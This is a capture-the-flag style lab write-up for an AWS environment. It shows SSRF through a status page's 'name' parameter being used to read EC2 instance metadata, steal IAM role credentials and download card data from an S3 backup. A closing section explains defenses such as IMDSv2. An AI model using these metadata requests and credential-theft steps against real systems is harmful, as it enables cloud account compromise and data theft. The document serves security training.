---
title: SSRF to Pwned
description: SSRF to Pwned
image:
  path: aws.jpg
categories:
- Pwned Labs
- AWS
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/aws/
tags:
- pwnedlabs
- aws
- cloud
---
# Scenario
Rumors are swirling on hacker forums about a potential breach at Huge Logistics. Your team has been monitoring these conversations closely, and Huge Logistics has asked you to assess the security of their website. Beyond the surface-level assessment, you're also to investigate links to their cloud infrastructure, mapping out any potential risk exposure. The question isn't just if they've been compromised, but how deep the rabbit hole goes.

# Walkthrough
The website `http://app.huge-logistics.com/`

![](ssrf-to-pwned-1.png)

If we check source code, we see AWS S3 bucket `huge-logistics-storage.s3.amazonaws.com`

![](ssrf-to-pwned-2.png)

If we visit the `https://huge-logistics-storage.s3.amazonaws.com`, we see the content of the bucket

![](ssrf-to-pwned-3.png)

There are `web` and `backup` folders. `backup` contains `cc-export2.txt` and `flag.txt`, but we can't access them. 

If we continue investigating the website, we find interesting `Status` page, http://app.huge-logistics.com/status/status.php

![](ssrf-to-pwned-4.png)

If we click check, we see that we are redirected to the same page with `name` parameter: `http://app.huge-logistics.com/status/status.php?name=hugelogisticsstatus.com`. The output shows the service status. Based on this information, we can assume that server uses `name` parameter and makes requests to the defined value, which could be indicator of SSRF.  

![](ssrf-to-pwned-5.png)

We can guess that the website is hosted on an EC2 instance, which have an Instance Metadata Service (IMDS). The Amazon EC2 IMDS provides data about the instance that allow for configuration and management. Commonly, EC2 instances are configured with an IAM (Identity and Access Management) role, that allows the instance to interact with other AWS services. Admins can also retrieve and use the role's temporary security credentials (access key ID, secret access key, and session token) from the instance metadata.

Let's try exploiting SSRF by requesting link-local IP address `169.254.169.254` that hosts the metadata service. Thus, set the value of `name` parameter to `169.254.169.254/latest/meta-data/` and send the request. The response confirms that this is EC2 instance

![](ssrf-to-pwned-6.png)

Let's continue with exploitation by checking `169.254.169.254/latest/meta-data/iam/info`, which should reveal configured IAM role: `MetapwnedS3Access`

![](ssrf-to-pwned-7.png)

Now, let's access credentials via `169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access`

![](ssrf-to-pwned-8.png)

By using acquired credentials, we can authenticate
```
aws configure
aws configure set aws_session_token "TOKEN_VALUE"
```

We can confirm that we are operating under `MetapwnedS3Access` role
```
└─$ aws sts get-caller-identity                            
{
    "UserId": "AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1",
    "Account": "104506445608",
    "Arn": "arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1"
}
```

Let's list the bucket
```
└─$ aws s3 ls huge-logistics-storage                    
                           PRE backup/
                           PRE web/

```

Now we can download the content of the backup folder 
```
└─$ aws s3 cp s3://huge-logistics-storage/backup/cc-export2.txt -
VISA, 4929854977595222, 5/2028, 733
VISA, 4532044427558124, 7/2024, 111
VISA, 4539773096403690, 12/2028, 429
VISA, 4485480371143975, 4/2027, 744
VISA, 4556373594815152, 5/2024, 188
VISA, 4532459642763863, 10/2023, 808
VISA, 4838078625735408, 3/2024, 586
<SNIP>
```

# Defense
This part is from [lab's defense section](https://pwnedlabs.io/labs/ssrf-to-pwned)

It's recommended to use version 2, which requires authentication, in case instance metadata is needed. Attacker who managed to gain access to the EC2 instance by another means would still be able to access IMDSv2 and access any stored credentials. If an EC2 instance has already been created with instance metadata, but it's not used in an environment, it can be disabled using Example 2 of the AWS [guide](https://docs.aws.amazon.com/cli/latest/reference/ec2/modify-instance-metadata-options.html)

Also, Jeff Barr announced (November 2023) that AWS have changed the default configuration so that all console Quick Start launches will use IMDSv2 only. In his [AWS blog article](https://aws.amazon.com/blogs/aws/amazon-ec2-instance-metadata-service-imdsv2-by-default/), that after mid-2024, newly released Amazon EC2 instance types will use only version 2 of the EC2 Instance Metadata Service (IMDSv2).
```
Metadata version

You can run V1 and V2, or just V2. If you do not specify a value, the default is V1 and V2. If no value is specified the value of the source template will still be used. If the template value is not specified then the default API value will be used.
```

Prior to the changes, versions 1 and 2 of the instance metadata service would still be available by default (unless specified otherwise) when creating EC2 instances. Version 1 of the AWS instance metadata service (IMDSv1) does not require authentication. Any process that can make HTTP requests to http://169.254.169.254/ could access the IMDSv2 data.

Another issue that led to this breach is that the entire bucket is listable by anyone in the world. Despite a warning about this setting, there are many cases of S3 buckets online where this setting has been enabled. S3 buckets allow files to be made publicly available without having to grant excessive permissions. Also, S3 bucket wasn'nt named properly according to its use, and stored sensitive data on the same bucket as public web server files.

![](ssrf-to-pwned-9.png)
